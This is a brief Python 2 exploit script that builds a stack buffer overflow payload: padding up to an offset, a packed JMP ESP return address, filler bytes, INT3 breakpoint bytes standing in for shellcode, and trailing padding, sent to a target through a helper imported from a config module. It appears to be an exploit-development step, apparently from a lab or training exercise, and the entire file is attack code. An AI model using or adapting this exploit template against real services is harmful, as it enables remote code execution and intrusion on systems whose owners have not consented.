#!/usr/bin/env python2
import socket
import struct
from config import *

buf = ""
buf += "A"*(OFFSET - len(buf))
buf += struct.pack("<I", JMPESP)
buf += "Z"*NO_Z
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(BUFT - len(buf))

connect(buf)
